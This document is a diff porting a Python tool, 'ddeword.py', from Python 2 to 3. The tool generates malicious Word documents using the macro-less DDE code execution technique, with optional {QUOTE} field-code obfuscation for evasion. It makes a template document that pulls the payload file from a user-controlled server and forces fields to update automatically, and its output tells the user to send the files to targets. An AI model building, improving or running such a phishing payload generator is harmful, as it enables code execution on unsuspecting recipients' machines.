@@ -1,3 +1,4 @@
+from __future__ import print_function
 import zipfile
 import argparse
 import os
@@ -13,43 +14,38 @@ Overview:
 Leverages the macro-less DDE code execution technique described 
 by @_staaldraad and @0x5A1F (blog post link in References 
 section below) to generate two malicious Word documents:
-
 Usage:
 Insert a simple (unobfuscated) DDE command string into the 
 payload document:
-
     python ddeword.py
-
 Insert an obfuscated DDE command string by way of the {QUOTE} 
 field code technique into the payload document:
-
     python ddeword.py --obfuscate
-
 Both forms of usage will generate two Word documents:
-
 *out/template-final.docx*
 - The webSettings are configured to pull the DDE element from 
   payload-final.docx or   payload-obfuscated-final.docx, which 
   is hosted by a server specified by the user. 
-
 *out/payload-final.docx* (not obfuscated)  
 *out/payload-obfuscated-final.docx* (obfuscated)
 - Contains user-provided DDE payload/command string. Hosted by
   user-controlled server (URL provided by user and baked into 
   template-final.docx).
-
 Obfuscation and evasion techniques inspired by @_staaldraad 
 (blog post link in References section below).
-
 References:
 https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/
 https://staaldraad.github.io/2017/10/23/msword-field-codes/
-
 Additional Thanks:
 @ryHanson
 @SecuritySift
 @GossiTheDog
 """
+
+try:
+    raw_input          # Python 2
+except NameError:
+    raw_input = input  # Python 3
 
 def arg_parse():
     """Parse command-line arguments."""
@@ -90,7 +86,7 @@ def gen_payload(obfuscate):
 
     # Obfuscate provided DDE payload (if enabled)
     if obfuscate:
-        print "[*] Converting DDE payload using {QUOTE} field code..."    
+        print("[*] Converting DDE payload using {QUOTE} field code...")    
         obfusc_payload = []
         obfusc_payload.append(obfuscate_dde(payload[1].replace('\\\\','\\')))
         obfusc_payload.append(obfuscate_dde(payload[2].replace('\\\\','\\')))
@@ -101,14 +97,14 @@ def gen_payload(obfuscate):
         payload[3] = '"' + payload[3] + '"'
     
     payload = " ".join(payload)
-    print '[*] Selected DDE payload: {}'.format(payload)
+    print('[*] Selected DDE payload: {}'.format(payload))
 
     if obfuscate:
-        print '[*] Obfuscated DDE payload: {}'.format(obfusc_payload)
+        print('[*] Obfuscated DDE payload: {}'.format(obfusc_payload))
 
     # Prompt user for server hosting payload Office document (referenced by 'template')
     # e.g., http://localhost:8000
-    targetsvr = raw_input("[-] Enter server URL (hosting payload Word file): ")
+    targetsvr = input("[-] Enter server URL (hosting payload Word file): ")
     if obfuscate:
         targetsvr = targetsvr + '/payload-obfuscated-final.docx'
     else:
@@ -164,13 +160,13 @@ if __name__ == "__main__":
     # automatically update fields within the document
     for node in settingtree.iter(tag=etree.Element):
         if node.tag == word_schema + "settings":
-            print '[*] Inserting updateFields XML element into {}/word/settings.xml...'.format(payload_out)
+            print('[*] Inserting updateFields XML element into {}/word/settings.xml...'.format(payload_out))
             node.insert(0,updatefields)
 
     # Find 'webSettings' XML element and insert frameset as child element
     for node in webtree.iter(tag=etree.Element):
         if node.tag == word_schema + "webSettings":
-            print '[*] Inserting frameset XML element into {}/word/webSettings.xml...'.format(template_out)
+            print('[*] Inserting frameset XML element into {}/word/webSettings.xml...'.format(template_out))
             node.insert(0,frameset)
 
     # Formulate XML elements necessary to insert nested, obfuscated DDE payload into 
@@ -180,7 +176,7 @@ if __name__ == "__main__":
                 '''
 
     # Find 'instrText' XML element and change value to DDE payload
-    print '[*] Inserting DDE payload into {}/word/document.xml...'.format(payload_out)
+    print('[*] Inserting DDE payload into {}/word/document.xml...'.format(payload_out))
     if obfuscate:
         for node in doctree.iter(tag=etree.Element):
             if node.tag == word_schema + "document":
@@ -243,4 +239,4 @@ if __name__ == "__main__":
     shutil.rmtree(tmp_dir_pay)
     shutil.rmtree(tmp_dir_template)
 
-    print '[*] Payload generation complete! Delivery methods below:\n\t1. Host {} at {} and send {} to your target(s).\n\t2. Send {} directly to your target(s).'.format(payload_out, targetsvr, template_out, payload_out)
+    print('[*] Payload generation complete! Delivery methods below:\n\t1. Host {} at {} and send {} to your target(s).\n\t2. Send {} directly to your target(s).'.format(payload_out, targetsvr, template_out, payload_out))
